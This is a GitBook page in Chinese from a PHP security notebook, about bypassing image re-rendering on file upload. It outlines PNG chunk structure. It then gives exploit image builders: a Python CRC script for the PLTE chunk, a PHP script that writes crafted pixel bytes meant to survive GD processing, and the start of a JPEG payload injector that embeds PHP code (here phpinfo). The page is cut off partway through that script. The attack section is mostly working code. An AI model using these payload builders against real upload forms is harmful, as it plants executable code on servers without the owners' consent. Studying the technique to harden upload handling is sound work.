
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>二次渲染绕过 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="代码逻辑绕过.html" />
    
    
    <link rel="prev" href="文件上传相关函数.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <span>
            
                    
                    PHP
            
                </span>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <span>
            
                    
                    0x01特性
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../PHP/PHP是一门动态语言.html">
            
                <a href="../PHP/PHP是一门动态语言.html">
            
                    
                    PHP是动态语言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../PHP/编码.html">
            
                <a href="../PHP/编码.html">
            
                    
                    PHP编码
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../PHP/参数传递.html">
            
                <a href="../PHP/参数传递.html">
            
                    
                    参数传递
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../PHP/REQUEST数组.html">
            
                <a href="../PHP/REQUEST数组.html">
            
                    
                    REQUEST数组数值获取顺序
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../PHP/url非法键值替换问题.html">
            
                <a href="../PHP/url非法键值替换问题.html">
            
                    
                    GET数组键值特殊字符替换
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../PHP/弱比较.html">
            
                <a href="../PHP/弱比较.html">
            
                    
                    弱比较浅析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../PHP/命名空间.html">
            
                <a href="../PHP/命名空间.html">
            
                    
                    命名空间浅析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../PHP/匿名函数.html">
            
                <a href="../PHP/匿名函数.html">
            
                    
                    匿名函数浅析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../PHP/回调函数.html">
            
                <a href="../PHP/回调函数.html">
            
                    
                    回调函数浅析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.10" data-path="../PHP/重构函数和反射.html">
            
                <a href="../PHP/重构函数和反射.html">
            
                    
                    重构函数和反射
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.11" data-path="../PHP/利用函数进行数据收集.html">
            
                <a href="../PHP/利用函数进行数据收集.html">
            
                    
                    利用函数进行数据的收集
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.12" data-path="../PHP/pcre回溯问题.html">
            
                <a href="../PHP/pcre回溯问题.html">
            
                    
                    pcre回溯问题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.13" data-path="../PHP/Session不同解析方式.html">
            
                <a href="../PHP/Session不同解析方式.html">
            
                    
                    SESSION的不同解析方式
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    0x02 技巧
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../PHP/问题函数.html">
            
                <a href="../PHP/问题函数.html">
            
                    
                    问题函数
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../PHP/绕过open_basedir.html">
            
                <a href="../PHP/绕过open_basedir.html">
            
                    
                    绕过open_basedir
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../PHP/绕过disable_function.html">
            
                <a href="../PHP/绕过disable_function.html">
            
                    
                    绕过disable_function
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../PHP/循环嵌套函数GetShell.html">
            
                <a href="../PHP/循环嵌套函数GetShell.html">
            
                    
                    循环嵌套函数Getshell
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../PHP/PHP和XXE.html">
            
                <a href="../PHP/PHP和XXE.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" >
            
                <span>
            
                    
                    0x04 反序列化
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../PHP/ctf_unserialize.html">
            
                <a href="../PHP/ctf_unserialize.html">
            
                    
                    CTF中的反序列化
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="../PHP/查找存在指定魔术方法的类.html">
            
                <a href="../PHP/查找存在指定魔术方法的类.html">
            
                    
                    查找存在指定魔术方法的类
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="../PHP/SimpleXMLElement.html">
            
                <a href="../PHP/SimpleXMLElement.html">
            
                    
                    SimpleXMLElement
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.4" data-path="../PHP/Phar的文件包含与反序列化.html">
            
                <a href="../PHP/Phar的文件包含与反序列化.html">
            
                    
                    Phar的文件包含与反序列化
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.5" data-path="../PHP/Soap和CRLF攻击.html">
            
                <a href="../PHP/Soap和CRLF攻击.html">
            
                    
                    Soap和CRLF攻击
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.6" data-path="../PHP/Session不同解析方式.html">
            
                <a href="../PHP/Session不同解析方式.html">
            
                    
                    SESSION的不同解析方式
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" >
            
                <span>
            
                    
                    0x05 文件上传
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="../PHP/PHP7的2个core_dumped错误.html">
            
                <a href="../PHP/PHP7的2个core_dumped错误.html">
            
                    
                    上传临时文件
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1.1" data-path="CVE-2015-2348_00截断.html">
            
                <a href="CVE-2015-2348_00截断.html">
            
                    
                    00截断
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.2" data-path="文件上传相关函数.html">
            
                <a href="文件上传相关函数.html">
            
                    
                    文件上传相关函数
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.7.1.3" data-path="二次渲染绕过.html">
            
                <a href="二次渲染绕过.html">
            
                    
                    二次渲染绕过
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.4" data-path="代码逻辑绕过.html">
            
                <a href="代码逻辑绕过.html">
            
                    
                    代码逻辑绕过
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.5" data-path="usr.ini绕过.html">
            
                <a href="usr.ini绕过.html">
            
                    
                    上传.usr.ini
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.6" data-path="htaccess上传绕过.html">
            
                <a href="htaccess上传绕过.html">
            
                    
                    上传.htaccess
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" >
            
                <span>
            
                    
                    0x06 文件包含
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../PHP/伪协议文件包含.html">
            
                <a href="../PHP/伪协议文件包含.html">
            
                    
                    PHP伪协议
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../PHP/包含日志.html">
            
                <a href="../PHP/包含日志.html">
            
                    
                    包含日志
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../PHP/包含environ.html">
            
                <a href="../PHP/包含environ.html">
            
                    
                    包含environ
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.4" data-path="../PHP/PHP7的2个core_dumped错误.html">
            
                <a href="../PHP/PHP7的2个core_dumped错误.html">
            
                    
                    包含临时文件
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.5" data-path="../PHP/包含session文件.html">
            
                <a href="../PHP/包含session文件.html">
            
                    
                    包含SESSION文件
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" >
            
                <span>
            
                    
                    0x07 版本迭代
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.9.1" data-path="../PHP/PHP7.0.html">
            
                <a href="../PHP/PHP7.0.html">
            
                    
                    PHP7.0
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.2" data-path="../PHP/PHP7.1.html">
            
                <a href="../PHP/PHP7.1.html">
            
                    
                    PHP7.1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.3" data-path="../PHP/PHP7.2.html">
            
                <a href="../PHP/PHP7.2.html">
            
                    
                    PHP7.2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.10" >
            
                <span>
            
                    
                    0x08 杂项
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.10.1" data-path="../PHP/M1_VSCODE调试php源码.html">
            
                <a href="../PHP/M1_VSCODE调试php源码.html">
            
                    
                    M1_VSCODE调试php源码
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10.2" data-path="../PHP/CGI_FastCGI和PHP-FPM关系.html">
            
                <a href="../PHP/CGI_FastCGI和PHP-FPM关系.html">
            
                    
                    CGI_FastCGI和PHP-FPM关系
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10.3" data-path="../PHP/PHP的编译与执行.html">
            
                <a href="../PHP/PHP的编译与执行.html">
            
                    
                    PHP的编译与执行
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >二次渲染绕过</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x7ED5;&#x8FC7;">&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x7ED5;&#x8FC7;</h1>
<p>&#x53C2;&#x8003;&#xFF1A;</p>
<ul>
<li><a href="https://xz.aliyun.com/t/2657" target="_blank">https://xz.aliyun.com/t/2657</a></li>
<li><a href="https://www.jianshu.com/p/4d8cace82028" target="_blank">https://www.jianshu.com/p/4d8cace82028</a></li>
</ul>
<h2 id="png&#x6587;&#x4EF6;&#x7ED3;&#x6784;&#x7B80;&#x6790;">PNG&#x6587;&#x4EF6;&#x7ED3;&#x6784;&#x7B80;&#x6790;</h2>
<p>PNG&#x6587;&#x4EF6;&#x4E00;&#x822C;&#x7531;8&#x5B57;&#x8282;&#x7684;PNG&#x6587;&#x4EF6;&#x7F72;&#x540D;(PNG file signature)&#x57DF;&#x548C;4&#x4E2A;&#x6570;&#x636E;&#x5757;&#x3002;</p>
<p>8&#x5B57;&#x8282;&#x6587;&#x4EF6;&#x7F72;&#x540D;&#xFF1A;<code>89 50 4e 47 0d 0a 1a 0a</code></p>
<h3 id="&#x6570;&#x636E;&#x5757;">&#x6570;&#x636E;&#x5757;</h3>
<p><strong>&#x6570;&#x636E;&#x5757;&#x7ED3;&#x6784;&#x89C4;&#x5B9A;</strong>  </p>
<ul>
<li>&#x957F;&#x5EA6;&#xFF1A;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#xFF0C;&#x7ED9;&#x51FA;&#x6570;&#x636E;&#x5757;&#x7684;&#x6570;&#x636E;&#x5B57;&#x6BB5;&#x7684;&#x957F;&#x5EA6;&#xFF08;&#x4EE5;&#x5B57;&#x8282;&#x8BA1;&#xFF09;&#x3002; &#x957F;&#x5EA6;&#x53EA;&#x8BA1;&#x7B97;&#x6570;&#x636E;&#x57DF;&#xFF0C;&#x4E3A;&#x4E86;&#x517C;&#x5BB9;&#x4E00;&#x4E9B;&#x4E0D;&#x652F;&#x6301;&#x65E0;&#x7B26;&#x53F7;&#x7684;&#x8BED;&#x8A00;,&#x6240;&#x4EE5;&#x957F;&#x5EA6;&#x9650;&#x5236;&#x5728;(231 - 1)&#x5B57;&#x8282;&#xFF0C;&#x4E0D;&#x80FD;&#x8FBE;&#x5230;(232 - 1)&#x5B57;&#x8282;&#x3002;</li>
<li>&#x6570;&#x636E;&#x5757;&#x7C7B;&#x578B;&#x7801;&#xFF1A;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;&#x5757;&#x7C7B;&#x578B;&#x4EE3;&#x7801;&#x3002; &#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x63CF;&#x8FF0;&#x548C;&#x68C0;&#x67E5;PNG&#x6587;&#x4EF6;&#xFF0C;&#x7C7B;&#x578B;&#x4EE3;&#x7801;&#x4EC5;&#x9650;&#x4E8E;&#x5927;&#x5199;&#x548C;&#x5C0F;&#x5199;&#x7684;ASCII&#x5B57;&#x6BCD;&#xFF08;A-Z&#x548C;a-z&#xFF0C;&#x4F7F;&#x7528;&#x5341;&#x8FDB;&#x5236;ASCII&#x4EE3;&#x7801;&#x8868;&#x793A;&#x4E3A;65-90&#x548C;97-122&#xFF09;&#x3002; &#x7136;&#x800C;&#xFF0C;&#x7F16;&#x7801;&#x5668;&#x548C;&#x89E3;&#x7801;&#x5668;&#x5FC5;&#x987B;&#x628A;&#x4EE3;&#x7801;&#x4F5C;&#x4E3A;&#x56FA;&#x5B9A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x503C;&#x800C;&#x975E;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5904;&#x7406;&#x3002;</li>
<li>&#x6570;&#x636E;&#x57DF;&#xFF1A;&#x6570;&#x636E;&#x5757;&#x7684;&#x6570;&#x636E;&#x57DF;&#xFF0C;&#x5B58;&#x50A8;&#x6309;&#x7167;&#x6570;&#x636E;&#x5757;&#x7C7B;&#x578B;&#x7801;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#xFF08;&#x5982;&#x679C;&#x6709;&#x7684;&#x8BDD;&#xFF09;&#x3002; &#x8BE5;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x662F;&#x957F;&#x5EA6;&#x4E3A;&#x96F6;&#x3002;</li>
<li>&#x5FAA;&#x73AF;&#x5197;&#x4F59;&#x68C0;&#x6D4B;&#xFF1A;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;CRC&#xFF08;&#x5FAA;&#x73AF;&#x5197;&#x4F59;&#x6821;&#x9A8C;&#xFF09;&#x8BA1;&#x7B97;&#xFF0C;&#x5728;&#x6240;&#x8FF0;&#x5757;&#x7684;&#x524D;&#x9762;&#x7684;&#x5B57;&#x8282;&#xFF0C;&#x5305;&#x62EC;&#x8BE5;&#x5757;&#x7C7B;&#x578B;&#x7684;&#x4EE3;&#x7801;&#x548C;&#x6570;&#x636E;&#x5757;&#x7684;&#x6570;&#x636E;&#x5B57;&#x6BB5;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5305;&#x62EC;&#x957F;&#x5EA6;&#x5B57;&#x6BB5;&#x3002; CRC&#x59CB;&#x7EC8;&#x5B58;&#x5728;&#xFF0C;&#x5373;&#x4F7F;&#x4E0D;&#x5305;&#x542B;&#x6570;&#x636E;&#x5757;&#x3002;<code>CRC(cyclic redundancy check</code>&#x57DF;&#x4E2D;&#x7684;&#x503C;&#x662F;&#x5BF9;<code>Chunk Type Code</code>&#x57DF;&#x548C;<code>Chunk Data</code>&#x57DF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;&#x3002;CRC&#x5177;&#x4F53;&#x7B97;&#x6CD5;&#x5B9A;&#x4E49;&#x5728;<code>ISO 3309</code>&#x548C;<code>ITU-T V.42</code>&#x4E2D;&#x3002;</li>
</ul>
<p><strong>&#x6570;&#x636E;&#x5757;&#x7C7B;&#x578B;</strong></p>
<p>  <img src="../images/19_6_17-&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;-&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x7ED5;&#x8FC7;1.png" alt=""></p>
<ul>
<li><p>IHDR&#xFF1A;&#x6587;&#x4EF6;&#x5934;&#x6570;&#x636E;&#x5757;IHDR(header chunk)&#xFF1A;&#x5B83;&#x5305;&#x542B;&#x6709;PNG&#x6587;&#x4EF6;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x56FE;&#x50CF;&#x6570;&#x636E;&#x7684;&#x57FA;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x8981;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5757;&#x51FA;&#x73B0;&#x5728;PNG&#x6570;&#x636E;&#x6D41;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x4E00;&#x4E2A;PNG&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5934;&#x6570;&#x636E;&#x5757;&#x3002;</p>
</li>
<li><p>PLTE&#xFF1A;&#x8C03;&#x8272;&#x677F;&#x6570;&#x636E;&#x5757;PLTE(palette chunk)&#x5305;&#x542B;&#x6709;&#x4E0E;&#x7D22;&#x5F15;&#x5F69;&#x8272;&#x56FE;&#x50CF;(indexed-color image)&#x76F8;&#x5173;&#x7684;&#x5F69;&#x8272;&#x53D8;&#x6362;&#x6570;&#x636E;&#xFF0C;&#x5B83;&#x4EC5;&#x4E0E;&#x7D22;&#x5F15;&#x5F69;&#x8272;&#x56FE;&#x50CF;&#x6709;&#x5173;&#xFF0C;&#x800C;&#x4E14;&#x8981;&#x653E;&#x5728;&#x56FE;&#x50CF;&#x6570;&#x636E;&#x5757;(image data chunk)&#x4E4B;&#x524D;&#x3002;PLTE&#x6570;&#x636E;&#x5757;&#x662F;&#x5B9A;&#x4E49;&#x56FE;&#x50CF;&#x7684;&#x8C03;&#x8272;&#x677F;&#x4FE1;&#x606F;&#xFF0C;PLTE&#x53EF;&#x4EE5;&#x5305;&#x542B;<code>1~256</code>&#x4E2A;&#x8C03;&#x8272;&#x677F;&#x4FE1;&#x606F;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x8C03;&#x8272;&#x677F;&#x4FE1;&#x606F;&#x7531;3&#x4E2A;&#x5B57;&#x8282;&#x7EC4;&#x6210;&#x3002;</p>
</li>
<li><p>IDAT&#xFF1A;&#x56FE;&#x50CF;&#x6570;&#x636E;&#x5757;IDAT(image data chunk)&#xFF1A;&#x5B83;&#x5B58;&#x50A8;&#x5B9E;&#x9645;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5728;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x53EF;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x8FDE;&#x7EED;&#x987A;&#x5E8F;&#x7684;&#x56FE;&#x50CF;&#x6570;&#x636E;&#x5757;&#x3002;IDAT&#x5B58;&#x653E;&#x7740;&#x56FE;&#x50CF;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x679C;&#x80FD;&#x591F;&#x4E86;&#x89E3;IDAT&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x7684;&#x751F;&#x6210;PNG&#x56FE;&#x50CF;&#x3002;</p>
</li>
<li><p>IEND&#xFF1A;&#x56FE;&#x50CF;&#x7ED3;&#x675F;&#x6570;&#x636E;IEND(image trailer chunk)&#xFF1A;&#x5B83;&#x7528;&#x6765;&#x6807;&#x8BB0;PNG&#x6587;&#x4EF6;&#x6216;&#x8005;&#x6570;&#x636E;&#x6D41;&#x5DF2;&#x7ECF;&#x7ED3;&#x675F;&#xFF0C;&#x5E76;&#x4E14;&#x5FC5;&#x987B;&#x8981;&#x653E;&#x5728;&#x6587;&#x4EF6;&#x7684;&#x5C3E;&#x90E8;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;PNG&#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x7ED3;&#x5C3E;12&#x4E2A;&#x5B57;&#x7B26;&#x770B;&#x8D77;&#x6765;&#x603B;&#x5E94;&#x8BE5;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;
0000000049454E44AE426082&#xFF0C;&#x4E0D;&#x96BE;&#x660E;&#x767D;&#xFF0C;&#x7531;&#x4E8E;&#x6570;&#x636E;&#x5757;&#x7ED3;&#x6784;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;IEND&#x6570;&#x636E;&#x5757;&#x7684;&#x957F;&#x5EA6;&#x603B;&#x662F;0&#xFF08;00 00 00 00&#xFF0C;&#x9664;&#x975E;&#x4EBA;&#x4E3A;&#x52A0;&#x5165;&#x4FE1;&#x606F;&#xFF09;&#xFF0C;&#x6570;&#x636E;&#x6807;&#x8BC6;&#x603B;&#x662F;IEND&#xFF08;49 45 4E 44&#xFF09;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;CRC&#x7801;&#x4E5F;&#x603B;&#x662F;AE 42 60 82&#x3002;</p>
</li>
</ul>
<h2 id="exp&#x56FE;&#x7247;&#x6784;&#x9020;">exp&#x56FE;&#x7247;&#x6784;&#x9020;</h2>
<h3 id="gif">GIF</h3>
<p>&#x5BF9;&#x6BD4;&#x4E0D;&#x53D8;&#x7684;&#x56FE;&#x7247;&#x70B9;&#x63D2;&#x5165;&#x5373;&#x53EF;</p>
<h3 id="png">PNG</h3>
<p>PLET&#x6570;&#x636E;&#x5757;&#x7684;CRC&#x8BA1;&#x7B97;&#x811A;&#x672C;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> re

png = open(<span class="hljs-string">r&apos;2.png&apos;</span>,<span class="hljs-string">&apos;rb&apos;</span>)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

<span class="hljs-string">&apos;&apos;&apos; PLTE crc &apos;&apos;&apos;</span>
data =  <span class="hljs-string">&apos;504c5445&apos;</span>+ re.findall(<span class="hljs-string">&apos;504c5445(.*?)49444154&apos;</span>,hexstr)[<span class="hljs-number">0</span>]
crc = binascii.crc32(data[:<span class="hljs-number">-16</span>].decode(<span class="hljs-string">&apos;hex&apos;</span>)) &amp; <span class="hljs-number">0xffffffff</span>
<span class="hljs-keyword">print</span> hex(crc)
</code></pre>
<p>&#x76F4;&#x63A5;&#x751F;&#x6210;&#x56FE;&#x7247;&#x7684;&#x811A;&#x672C;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,
           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,
           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,
           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,
           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,
           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,
           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,
           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);



$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);

<span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) {
   $r = $p[$y];
   $g = $p[$y+<span class="hljs-number">1</span>];
   $b = $p[$y+<span class="hljs-number">2</span>];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);
}

imagepng($img,<span class="hljs-string">&apos;./1.png&apos;</span>);
<span class="hljs-meta">?&gt;</span>
</code></pre>
<h3 id="jpg">JPG</h3>
<p>jpg.php</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">/*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */</span>

    $miniPayload = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;


    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&apos;gd&apos;</span>) || !function_exists(<span class="hljs-string">&apos;imagecreatefromjpeg&apos;</span>)) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php-gd is not installed&apos;</span>);
    }

    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($argv[<span class="hljs-number">1</span>])) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;</span>);
    }

    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);

    <span class="hljs-keyword">for</span>($pad = <span class="hljs-number">0</span>; $pad &lt; <span class="hljs-number">1024</span>; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = <span class="hljs-keyword">new</span> DataInputStream($argv[<span class="hljs-number">1</span>]);
        $outStream = file_get_contents($argv[<span class="hljs-number">1</span>]);
        $extraBytes = <span class="hljs-number">0</span>;
        $correctImage = <span class="hljs-keyword">TRUE</span>;

        <span class="hljs-keyword">if</span>($dis-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) {
